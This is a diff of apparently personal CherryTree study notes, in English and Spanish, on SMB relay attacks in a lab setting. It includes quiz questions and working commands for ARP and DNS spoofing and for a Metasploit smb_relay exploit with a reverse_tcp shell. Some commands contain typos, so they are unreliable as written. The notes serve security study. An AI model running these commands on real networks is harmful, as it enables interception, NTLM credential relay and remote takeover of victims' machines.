@@ -1,13 +1,90 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="22" master_id="0" name="SMB Relay Attack" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730765512" ts_lastsave="1730766489">
-    <rich_text>MITM 
+  <node unique_id="22" master_id="0" name="SMB Relay Attack" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730765512" ts_lastsave="1730929558">
+    <rich_text>Interceps smb traffic
+windows network commonly
+how works? 
 
-If the relay is succesful, the attacker can gain acces to the resources on the server, which migtht include sensitive files, databases, or  administrative privileges. This access could lead to further lateral movement...
+-Set up a mitm position, arp spoofing, dns poisoning or setting up a rogue smb server
+-capturing authentitacion. capture this data, which might include ntlm (nt lan manager) hashes.
+- relaying to a legitimate server: instead of decripting the ntlm hash, attacker relays it to another server that trust the source. This allows the attacker to impersonate the user whose hash was captured.
+-Gain acces: If the relay is succesful, the attacker can gain acces to the resources on the server, which migtht include sensitive files, databases, or administrative privileges. This access could lead to further lateral movement within the network.
 
-show options
 
-dnsspoof</rich_text>
-    <codebox char_offset="229" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">search smb_relay</codebox>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>show options
+set the exploit options
+TAKE CARE IF ECHO DOESNT SAVE DNS FILE (USE NANO OR VIM INSTEAD)
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>this point all requests for subdomains of ‘sportsfoo’.com to kali :D
+
+
+STEPS: 
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+
+questions
+dns spoofing vs dns poisoning vs arp spoofing
+
+
+
+
+In the final step of an SMB relay attack, what could an attacker potentially gain access to?
+Administrative privileges on a server
+
+What type of data does an attacker aim to capture during the authentication step of an SMB relay attack?
+NTLM hashes
+
+
+
+
+</rich_text>
+    <rich_text scale="h3">Resumen del Proceso Completo</rich_text>
+    <rich_text>
+1. </rich_text>
+    <rich_text weight="heavy">Posición de MitM</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">arpspoof</rich_text>
+    <rich_text> y </rich_text>
+    <rich_text family="monospace">dnsspoof</rich_text>
+    <rich_text> te colocan en una posición de intermediario, redirigiendo el tráfico hacia ti.
+2. </rich_text>
+    <rich_text weight="heavy">Captura de Credenciales</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">smb_relay</rich_text>
+    <rich_text> intercepta las credenciales SMB del objetivo, permitiéndote suplantar al usuario o ejecutar comandos en su máquina.
+3. </rich_text>
+    <rich_text weight="heavy">Shell Remota</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">reverse_tcp</rich_text>
+    <rich_text> establece una conexión de regreso, permitiéndote acceder directamente al sistema del objetivo y realizar actividades de post-explotación.
+
+
+</rich_text>
+    <codebox char_offset="701" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">search smb_relay</codebox>
+    <codebox char_offset="804" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">echo “&lt;IP&gt; *sportsfoo” &gt; dns
+</codebox>
+    <codebox char_offset="884" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">dnspoof -i eth1 -f dns</codebox>
+    <codebox char_offset="886" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#IN OTHER TERMINAL
+echo 1 &gt; /proc.sys/net/ipv4/ip forward
+arpspoof -i eth1 -t &lt;target IP&gt; &lt;gateway IP&gt;
+</codebox>
+    <codebox char_offset="888" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#IN OTHER TERMINAL
+arpspoof -i eth1 -t &lt;gateway IP&gt; &lt;target IP&gt;</codebox>
+    <codebox char_offset="890" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#MSF
+smb_relay)&gt; exploit
+smb_relay)&gt; jobs</codebox>
   </node>
 </cherrytree>
